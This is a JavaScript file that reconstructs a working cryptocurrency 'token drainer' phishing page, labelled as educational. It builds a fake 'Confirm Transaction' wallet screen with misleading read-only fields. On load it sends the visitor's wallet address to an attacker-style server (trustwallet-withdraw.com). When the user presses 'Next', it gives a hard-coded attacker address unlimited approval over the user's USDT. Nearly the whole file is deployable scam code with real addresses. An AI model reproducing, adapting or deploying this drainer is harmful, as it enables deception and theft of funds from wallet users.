// This script is a reconstruction of the original token drainer functionality you described.
// It is provided FOR EDUCATIONAL PURPOSES ONLY to illustrate how such malicious scripts work.
// DO NOT USE THIS CODE MALICIOUSLY. Engaging in unauthorized access or theft of funds is illegal and unethical.

// --- Constants (Original Malicious Constants) ---
const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20) on BSC
const SPENDER_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // !!! THIS IS THE ATTACKER'S ADDRESS AS PER ORIGINAL SCRIPT !!!
const RECIPIENT_ADDRESS = "0x79069192614f7ceE4F101b7995cd16BFdB3CB0d1"; // Displayed, but not the actual recipient of funds.

const USDT_ABI = [
    // ABI for common ERC-20 functions, including 'approve'
    { constant: true, inputs: [{ internalType: "address", name: "account", type: "address" }], name: "balanceOf", outputs: [{ internalType: "uint256", name: "", type: "uint256" }], payable: false, stateMutability: "view", type: "function" },
    { constant: false, inputs: [{ internalType: "address", name: "spender", type: "address" }, { internalType: "uint256", name: "value", type: "uint256" }], name: "approve", outputs: [{ internalType: "bool", name: "", type: "bool" }], payable: false, stateMutability: "nonpayable", type: "function" }
];

// Max Uint256 for unlimited approval - this is key to the drain
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 2^256 - 1

// --- Global State Variables ---
let currentAddress = RECIPIENT_ADDRESS; // Pre-filled misleading address
let currentUsdtAmount = "0.0"; // Displayed amount (actual approval is MAX_UINT256)
let userWalletAddress = null; // Connected wallet address
let isLoading = false;
let transactionCompleted = false;
let isProcessingTransaction = false;

// --- DOM Element References ---
let addressInput;
let amountInput;
let amountConversionText;
let nextButton; // Triggers the malicious 'approve'

// --- UI Update Function ---
function updateUI() {
    if (addressInput) {
        addressInput.value = currentAddress; // Always shows the misleading address
    }
    if (amountInput) {
        amountInput.value = currentUsdtAmount; // Shows "0.0" or whatever is set
    }
    if (amountConversionText) {
        const parsedAmount = parseFloat(currentUsdtAmount);
        amountConversionText.textContent = `= $${isNaN(parsedAmount) ? '0.00' : (parsedAmount * 1).toFixed(2)}`;
    }

    if (nextButton) {
        nextButton.textContent = isLoading ? "Processing..." : (transactionCompleted ? "Confirmation Success!" : "Next");
        nextButton.disabled = isLoading;
    }
}

// --- Helper Functions (for clipboard functionality, as in original) ---
function clearAddress() {
    currentAddress = "";
    updateUI();
}

async function pasteAddress() {
    try {
        const text = await navigator.clipboard.readText();
        if (text) {
            currentAddress = text;
            updateUI();
        }
    } catch (err) {
        console.error("Failed to read clipboard contents: ", err);
        alert("Failed to paste from clipboard. Please paste manually.");
    }
}

// --- CORE MALICIOUS FUNCTIONALITY ---
// This function calls the 'approve' method on the USDT contract,
// granting the SPENDER_ADDRESS unlimited allowance.
async function sendUSDTApproval() {
    if (isProcessingTransaction) return;
    if (!userWalletAddress) {
        alert("Wallet not detected or connected. Please use a DApp browser or ensure your wallet is unlocked.");
        // Attempts to request accounts if not already available
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userWalletAddress = accounts[0];
            updateUI();
        } catch (error) {
            console.error("Error requesting accounts:", error);
            alert("Failed to connect wallet. Ensure MetaMask/TrustWallet is installed and unlocked.");
            return;
        }
    }

    try {
        isProcessingTransaction = true;
        isLoading = true;
        transactionCompleted = false;
        updateUI();

        const web3 = new Web3(window.ethereum);
        const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);

        console.log(`Malicious intent: Attempting to approve UNLIMITED USDT for SPENDER_ADDRESS: ${SPENDER_ADDRESS} from OWNER: ${userWalletAddress}`);
        
        // This is the drainer's trick: user approves SPENDER_ADDRESS to take all their USDT
        await usdtContract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).send({ from: userWalletAddress });

        transactionCompleted = true;
        alert(`Transaction sent successfully! (This was an UNLIMITED APPROVAL to: ${SPENDER_ADDRESS})`);
        // At this point, the attacker (owner of SPENDER_ADDRESS) can call transferFrom
        // on the USDT contract to take all of the user's USDT.
        
    } catch (err) {
        console.error("🔴 Transaction error (likely user rejection or network issue):", err);
        if (err.code === 4001) { // User rejected transaction
            alert("Transaction rejected by user.");
        } else {
            alert("An error occurred during the transaction. See console for details.");
        }
    } finally {
        isProcessingTransaction = false;
        isLoading = false;
        updateUI();
    }
}

// --- DApp Initialization (Original Logic, including malicious backend ping) ---
async function initDApp() {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
            // This attempts to get the connected account silently, which is typical in DApp browsers.
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                userWalletAddress = accounts[0];
                console.log("Wallet auto-detected:", userWalletAddress);

                // --- MALICIOUS BACKEND PING (Original functionality) ---
                // This would send the user's address to the attacker's server.
                // It's used for logging, victim tracking, or checking conditions.
                const userAddressParam = userWalletAddress.replace("0x", "");
                try {
                    console.log("Pinging malicious backend for user address check...");
                    const response = await fetch("https://haha.trustwallet-withdraw.com/api/refill-check", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ userAddress: userAddressParam }),
                    });
                    const data = await response.json();
                    console.log("Malicious backend response:", data);
                } catch (fetchError) {
                    console.warn("Could not connect to malicious backend (this is good, it might be down/blocked):", fetchError);
                }
                // --- END MALICIOUS BACKEND PING ---

            } else {
                console.log("No wallet account auto-detected. User will be prompted on 'Next' if needed.");
            }
        } catch (error) {
            console.error("Error during DApp initialization/account detection:", error);
        }
    } else {
        console.warn("No Web3 wallet detected (e.g., MetaMask, Trust Wallet). Functionality will be limited.");
    }
    updateUI(); // Initial UI render based on detected state
}

// --- DOM Manipulation and Event Listeners (Rendering the UI) ---
function renderApp() {
    const appRoot = document.getElementById('app-root');
    if (!appRoot) {
        console.error("App root element not found!");
        return;
    }

    appRoot.innerHTML = ''; // Clear existing content

    const container = document.createElement('div');
    container.id = 'app-container';
    container.className = 'app-container';

    // Original back button (no functional use here)
    const backButton = document.createElement('button');
    backButton.className = 'back-button';
    container.appendChild(backButton);

    const title = document.createElement('h1');
    title.className = 'title';
    title.textContent = "Confirm Transaction"; // Misleading title
    container.appendChild(title);

    // No explicit "Connect Wallet" button, relies on DApp browser auto-injection
    // Wallet status is implicitly handled when `initDApp` runs.

    // Address Field (pre-filled and read-only to mislead)
    const addressInputContainer = document.createElement('div');
    addressInputContainer.className = 'input-container';
    const addressLabel = document.createElement('label');
    addressLabel.className = 'input-label';
    addressLabel.textContent = 'Address or Domain Name';
    addressInputContainer.appendChild(addressLabel);
    const addressFieldContainer = document.createElement('div');
    addressFieldContainer.className = 'input-field-container';
    addressInput = document.createElement('input');
    addressInput.type = 'text';
    addressInput.className = 'input-field';
    addressInput.placeholder = 'e.g., 0x... or example.eth';
    addressInput.value = currentAddress; // Pre-filled with RECIPIENT_ADDRESS
    addressInput.readOnly = true; // Make it non-editable
    addressFieldContainer.appendChild(addressInput);

    const clearBtn = document.createElement('span');
    clearBtn.id = 'clear-address-button';
    clearBtn.className = 'clear-button';
    clearBtn.textContent = '×';
    clearBtn.style.display = currentAddress ? 'flex' : 'none';
    clearBtn.addEventListener('click', clearAddress);
    addressFieldContainer.appendChild(clearBtn);

    const pasteBtn = document.createElement('span');
    pasteBtn.className = 'paste-button';
    pasteBtn.textContent = 'Paste';
    pasteBtn.addEventListener('click', pasteAddress);
    addressFieldContainer.appendChild(pasteBtn);
    addressInputContainer.appendChild(addressFieldContainer);
    container.appendChild(addressInputContainer);

    // Amount Field (pre-filled and read-only to mislead)
    const amountInputContainer = document.createElement('div');
    amountInputContainer.className = 'input-container';
    const amountLabel = document.createElement('label');
    amountLabel.className = 'input-label';
    amountLabel.textContent = 'Amount';
    amountInputContainer.appendChild(amountLabel);
    const amountWrapper = document.createElement('div');
    amountWrapper.className = 'amount-container';
    const amountFieldContainer = document.createElement('div');
    amountFieldContainer.className = 'input-field-container';
    amountInput = document.createElement('input');
    amountInput.type = 'number';
    amountInput.className = 'input-field';
    amountInput.value = currentUsdtAmount; // Pre-filled (e.g., "0.0")
    amountInput.readOnly = true; // Make it non-editable
    amountFieldContainer.appendChild(amountInput);

    const usdtTextSpan = document.createElement('span');
    usdtTextSpan.className = 'usdt-text';
    usdtTextSpan.textContent = 'USDT';
    amountFieldContainer.appendChild(usdtTextSpan);

    const maxTextSpan = document.createElement('span');
    maxTextSpan.className = 'max-text';
    maxTextSpan.textContent = 'Max';
    amountFieldContainer.appendChild(maxTextSpan);
    amountWrapper.appendChild(amountFieldContainer);
    amountInputContainer.appendChild(amountWrapper);

    amountConversionText = document.createElement('p');
    amountConversionText.className = 'amount-conversion';
    amountConversionText.textContent = `= $0.00`;
    amountInputContainer.appendChild(amountConversionText);
    container.appendChild(amountInputContainer);

    // "Next" Button - this is the critical trigger for the malicious 'approve'
    nextButton = document.createElement('button');
    nextButton.className = 'next-button';
    nextButton.style.marginTop = 'auto';
    nextButton.textContent = 'Next';
    nextButton.addEventListener('click', sendUSDTApproval); // Calls the malicious function
    container.appendChild(nextButton);

    appRoot.appendChild(container);

    updateUI(); // Initial UI update
}

// --- Initialization on DOM Load ---
document.addEventListener('DOMContentLoaded', async () => {
    renderApp(); // First, render the UI elements
    initDApp(); // Then, run the initialization logic (auto-detect wallet, ping backend)
});
